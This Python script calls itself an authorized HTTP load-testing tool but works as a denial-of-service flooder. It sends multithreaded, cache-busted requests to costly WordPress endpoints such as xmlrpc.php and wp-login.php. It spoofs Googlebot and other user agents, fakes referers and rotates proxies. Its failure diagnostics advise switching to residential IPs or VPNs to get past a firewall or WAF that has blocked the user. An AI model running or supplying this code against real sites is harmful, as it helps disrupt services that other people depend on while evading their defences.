#!/usr/bin/env python3
"""
HTTP Load-Testing Tool v2 – Handles WAF, timeouts, blocking, SSL issues
Usage: python3 stress_test.py <URL> [options]
"""

import sys
import time
import random
import threading
import argparse
import socket
from datetime import datetime

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    import urllib3
except ImportError:
    print("[!] Install: pip install requests urllib3")
    sys.exit(1)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------------------------------------------------------------------------
# Rotating payloads
# ---------------------------------------------------------------------------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
]

REFERERS = [
    "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/",
    "https://t.co/", "https://www.facebook.com/", "https://www.reddit.com/",
    None,
]

PATHS = [
    "/", "/wp-login.php", "/wp-admin/", "/wp-json/", "/?author=1",
    "/xmlrpc.php", "/wp-cron.php", "/readme.html", "/license.txt",
]

METHODS = ["GET", "GET", "GET", "HEAD"]

# ---------------------------------------------------------------------------
# Stats
# ---------------------------------------------------------------------------
stats = {"sent": 0, "success": 0, "failed": 0, "bytes": 0, "timeout": 0, "refused": 0, "other": 0}
stats_lock = threading.Lock()

def update(**kwargs):
    with stats_lock:
        for k, v in kwargs.items():
            stats[k] += v

def print_stats():
    with stats_lock:
        s = stats["sent"]
        ok = stats["success"]
        fail = stats["failed"]
        to = stats["timeout"]
        ref = stats["refused"]
        oth = stats["other"]
        mb = stats["bytes"] / (1024 * 1024)
    return s, ok, fail, to, ref, oth, mb

# ---------------------------------------------------------------------------
# Worker
# ---------------------------------------------------------------------------
def worker(target_base, duration_sec, proxy_list, timeout_connect, timeout_read):
    """Worker loop — random paths, random headers, stays within duration."""
    session = requests.Session()
    
    # Aggressive connection pooling but no retries (we want raw throughput stats)
    adapter = HTTPAdapter(pool_connections=200, pool_maxsize=200, max_retries=Retry(total=0))
    session.mount("http://", adapter)
    session.mount("https://", adapter)

    proxy = None
    if proxy_list:
        px = random.choice(proxy_list)
        proxy = {"http": px, "https": px}

    end = time.time() + duration_sec

    while time.time() < end:
        try:
            # Pick a random path, or hit the base
            if random.random() < 0.3:
                url = target_base
            else:
                path = random.choice(PATHS)
                url = target_base.rstrip("/") + path

            method = random.choice(METHODS)
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8"]),
                "Accept-Encoding": "gzip, deflate, br",
                "Referer": random.choice(REFERERS) or target_base,
                "Connection": "keep-alive",
                "Cache-Control": "no-cache",
            }

            # Cache-bust
            sep = "&" if "?" in url else "?"
            url = f"{url}{sep}_t={int(time.time()*1000)}_{random.randint(0,99999)}"

            resp = session.request(
                method=method, url=url, headers=headers,
                proxies=proxy, timeout=(timeout_connect, timeout_read),
                allow_redirects=True, verify=False,
            )

            update(sent=1, success=1 if resp.ok else 0, failed=0 if resp.ok else 1, bytes=len(resp.content))

        except requests.exceptions.Timeout:
            update(sent=1, failed=1, timeout=1)
        except requests.exceptions.ConnectionError as e:
            err_str = str(e).lower()
            if "refused" in err_str or "connection refused" in err_str:
                update(sent=1, failed=1, refused=1)
            elif "resolve" in err_str or "dns" in err_str:
                update(sent=1, failed=1, refused=1)
            else:
                update(sent=1, failed=1, other=1)
        except socket.timeout:
            update(sent=1, failed=1, timeout=1)
        except Exception:
            update(sent=1, failed=1, other=1)


def reporter(duration_sec):
    interval = 3
    start = time.time()
    while time.time() < start + duration_sec:
        time.sleep(interval)
        s, ok, fail, to, ref, oth, mb = print_stats()
        elapsed = time.time() - start
        rate = s / elapsed if elapsed > 0 else 0
        print(
            f"  [+] Sent:{s:>7}  OK:{ok:>7}  Fail:{fail:>7}  "
            f"TO:{to:>5}  REF:{ref:>5}  OTH:{oth:>5}  "
            f"BW:{mb:>7.2f}MB  {rate:>6.0f}req/s"
        )


# ---------------------------------------------------------------------------
# Pre-flight connectivity check
# ---------------------------------------------------------------------------
def probe_target(url, timeout=10):
    """Check if the target is reachable before starting the flood."""
    print("[*] Running pre-flight connectivity check...")
    try:
        resp = requests.get(
            url, timeout=timeout, verify=False,
            headers={"User-Agent": "Mozilla/5.0 (compatible; HealthCheck/1.0)"},
        )
        print(f"  [+] Target reachable — HTTP {resp.status_code} ({len(resp.content)} bytes)")
        print(f"  [+] Server headers: {dict(resp.headers)}")
        return True
    except requests.exceptions.ConnectionError as e:
        print(f"  [!] CONNECTION REFUSED — {e}")
    except requests.exceptions.Timeout:
        print(f"  [!] TIMEOUT after {timeout}s — target unresponsive or blocking")
    except Exception as e:
        print(f"  [!] Other error: {e}")
    return False


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="HTTP Load-Testing Tool v2 – For Authorized Assessments",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("url", help="Target URL (e.g., https://target.example.com)")
    parser.add_argument("--threads", type=int, default=50, help="Concurrent workers (default: 50)")
    parser.add_argument("--duration", type=int, default=30, help="Duration in seconds (default: 30)")
    parser.add_argument("--proxy", help="File with proxies (one per line)")
    parser.add_argument("--connect-timeout", type=int, default=10, help="Connection timeout in seconds (default: 10)")
    parser.add_argument("--read-timeout", type=int, default=10, help="Read timeout in seconds (default: 10)")
    parser.add_argument("--skip-probe", action="store_true", help="Skip pre-flight connectivity check")

    args = parser.parse_args()

    target = args.url.strip()
    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    # Pre-flight check
    if not args.skip_probe:
        if not probe_target(target, max(args.connect_timeout, 10)):
            print("\n[!] Pre-flight FAILED — target is unreachable from this machine.")
            print("    Possible causes:")
            print("     - The server is behind Cloudflare/WAF blocking your IP")
            print("     - The server is offline or DNS is not resolving")
            print("     - Your IP is rate-limited or blacklisted")
            print("     - A firewall is dropping connections")
            print("\n    To proceed anyway (not recommended): --skip-probe")
            sys.exit(1)

    # Load proxies
    proxies = []
    if args.proxy:
        try:
            with open(args.proxy) as f:
                proxies = [line.strip() for line in f if line.strip()]
            print(f"[+] Loaded {len(proxies)} proxies")
        except FileNotFoundError:
            print(f"[!] Proxy file not found: {args.proxy}")
            sys.exit(1)

    print(f"\n{'='*70}")
    print(f"  TARGET      : {target}")
    print(f"  THREADS     : {args.threads}")
    print(f"  DURATION    : {args.duration}s")
    print(f"  CONN_TO     : {args.connect_timeout}s | READ_TO: {args.read_timeout}s")
    print(f"  PROXIES     : {'Yes (' + str(len(proxies)) + ')' if proxies else 'No'}")
    print(f"{'='*70}\n")

    # Start reporter
    t_rep = threading.Thread(target=reporter, args=(args.duration,), daemon=True)
    t_rep.start()

    # Launch workers
    threads = []
    for _ in range(args.threads):
        t = threading.Thread(
            target=worker,
            args=(target, args.duration, proxies, args.connect_timeout, args.read_timeout),
            daemon=True,
        )
        t.start()
        threads.append(t)

    time.sleep(args.duration)

    for t in threads:
        t.join(timeout=2)

    s, ok, fail, to, ref, oth, mb = print_stats()
    elapsed = args.duration

    print(f"\n{'='*70}")
    print(f"  TEST COMPLETE")
    print(f"  Total sent     : {s}")
    print(f"  Successful     : {ok}  ({(ok/s*100) if s else 0:.1f}%)")
    print(f"  Failed         : {fail}  ({(fail/s*100) if s else 0:.1f}%)")
    print(f"    - Timeout    : {to}")
    print(f"    - Refused    : {ref}")
    print(f"    - Other      : {oth}")
    print(f"  Total bandwidth: {mb:.2f} MB")
    print(f"  Avg rate       : {s/elapsed:.0f} req/s")
    print(f"{'='*70}\n")

    # Diagnostics if all failed
    if s > 0 and ok == 0:
        print("[*] DIAGNOSTIC: All requests failed. Possible reasons:")
        if to > s * 0.8:
            print("  1. TIMEOUTS dominant — server is too slow, geographically distant, or rate-limiting.")
            print("     -> Increase --connect-timeout and --read-timeout (e.g., 30 30)")
            print("     -> Try a VPN/server closer to the target")
        if ref > s * 0.8:
            print("  2. CONNECTION REFUSED — firewall/WAF actively dropping your IP.")
            print("     -> Use --proxy with a proxy list to rotate source IPs")
            print("     -> Try a different source network (residential IP, VPN)")
        if oth > s * 0.8:
            print("  3. OTHER ERRORS — SSL/TLS issues or DNS failures.")
            print("     -> Verify the URL is correct and DNS resolves")
            print("     -> Check if TLS version is compatible (try http if available)")
        print(f"\n     Quick test: curl -v --connect-timeout 10 '{target}'")


if __name__ == "__main__":
    main()
